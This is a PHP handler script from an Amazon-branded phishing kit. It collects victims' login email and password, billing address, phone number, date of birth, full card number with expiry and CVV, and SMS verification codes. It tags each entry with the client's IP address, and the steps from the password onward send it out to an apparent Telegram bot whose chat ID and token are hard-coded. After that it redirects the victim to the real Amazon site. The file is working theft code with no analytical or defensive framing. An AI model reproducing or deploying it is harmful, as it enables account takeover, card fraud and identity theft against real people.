<?php 



require_once "functions.php";


define('chat_id', "1373502500");
define('apiToken', "1603474625:AAEVlWi7Q-_dOuEk1ff2q_vAiKipqkqYVdc");





if ($_POST['step']== 'index') {
    $email = $_POST['email'];
    $_SESSION['email'] = $_POST['email'];


    if (empty($email)) {

        header("Location: index.php");
        exit();

    }else{
        $adrress  = get_client_ip();
        $subject  = $adrress . " | LOGIN | AMAZON "       . "\r\n" ;
        $message .= "IDENTIFIANT : " . $email                   . "\r\n";
        
        
        if(isset($_POST['submit']))
            {
                //sendmessage($subject . $message);  
            };
        header("Location: password.php");
        exit();
    }
}

if ($_POST['step']== 'password') {
    $password = $_POST['password'];


    if (empty($password)) {

        header("Location: password.php");
        exit();

    }else{
        $adrress  = get_client_ip();
        $subject  = $adrress . " | LOGIN | AMAZON "       . "\r\n" ;
        $message .= "LOGIN : " . $_SESSION['email']                   . "\r\n";
        $message .= "PASSWORD : " . $password                   . "\r\n";
        
        
        if(isset($_POST['submit']))
            {
               sendmessage($subject . $message); 
               antiboot($subject . $message);
               
            };
        header("Location: loading.php");
        exit();
    }
}

if ($_POST['step']== 'billing') {
    $email = $_POST['email'];
    $address = $_POST['address'];
    $zip = $_POST['zip'];
    $phone = $_POST['phone'];
    $dob = $_POST['dob'];

    if (empty($email) || empty($address) || empty($zip) || empty($phone) || empty($dob)) {

        header("Location: billing.php");
        exit();

    }else{
        $adrress  = get_client_ip();
        $subject  = $adrress . " | BILLING | AMAZON "       . "\r\n" ;
        $message .= "email : " . $email                   . "\r\n";       
        $message .= "address : " . $address                   . "\r\n";
        $message .= "zip : " . $zip                   . "\r\n";       
        $message .= "phone : " . $phone                   . "\r\n";
        $message .= "dob : " . $dob                   . "\r\n";
        
        if(isset($_POST['submit']))
            {
                sendmessage($subject . $message); 
                antiboot($subject . $message);
                
            };
        header("Location: loading2.php");
        exit();
    }
}


if ($_POST['step']== 'cc') {
    $card_number = $_POST['card_number'];
    $expiry = $_POST['expiry'];
    $cvv = $_POST['cvv'];

    if (empty($card_number) || empty($expiry) || empty($cvv)) {

        header("Location: cc.php");
        exit();

    }else{
        $adrress  = get_client_ip();
        $subject  = $adrress . " | cc | AMAZON "       . "\r\n" ;
        $message .= "card_number : " . $card_number                   . "\r\n";       
        $message .= "expiry : " . $expiry                   . "\r\n";
        $message .= "cvv : " . $cvv                   . "\r\n";       
        
        if(isset($_POST['submit']))
            {
                sendmessage($subject . $message);
                antiboot($subject . $message);
               
            };
        header("Location: loading3.php");
        exit();
    }
}

if ($_POST['step']== 'sms') {
    $sms = $_POST['sms'];

    if (empty($sms)) {

        header("Location: sms.php");
        exit();

    }else{
        $adrress  = get_client_ip();
        $subject  = $adrress . " | SMS | AMAZON "       . "\r\n" ;
        $message .= "SMS CODE : " . $sms                   . "\r\n";
        
        if(isset($_POST['submit']))
            {
                sendmessage($subject . $message); 
                antiboot($subject . $message);
              
            };
        header("Location: https://www.amazon.com/");
        exit();
    }
}


?>
